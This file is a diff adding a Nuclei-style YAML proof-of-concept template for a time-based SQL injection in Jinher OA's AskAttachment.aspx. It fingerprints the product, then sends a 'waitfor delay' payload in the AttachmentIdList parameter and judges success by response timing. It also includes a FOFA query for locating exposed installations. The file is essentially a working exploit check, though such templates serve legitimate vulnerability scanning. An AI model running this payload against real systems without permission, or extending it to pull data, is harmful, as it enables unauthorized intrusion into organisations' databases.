@@ -1,0 +1,41 @@
+id: poc-yaml-jinher-askattachment-aspx-sqli
+info:
+  name: \u91d1\u548cOA AskAttachment.aspx SQL\u6ce8\u5165\u6f0f\u6d1e
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: \u91d1\u548cOA
+    fofa: app="\u91d1\u548c\u7f51\u7edc-\u91d1\u548cOA"
+
+variables:
+  t1: '{{rand_int(5, 10)}}'
+  t2: '{{to_number(t1) + 2}}'
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/C6/Jhsoft.Web.login/PassWordSlideFull.aspx"
+    matchers:
+      - type: word
+        words:
+          - "JHSoft"
+        part: body
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/c6/Jhsoft.Web.Ask/AskAttachment.aspx/?AttachmentIdList=1)waitfor+delay'0:0:{{t1}}'--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "SessionId="
+        part: header
+      - type: dsl
+        dsl:
+          - body == ""
+          - duration >= t1
+          - duration <= t2
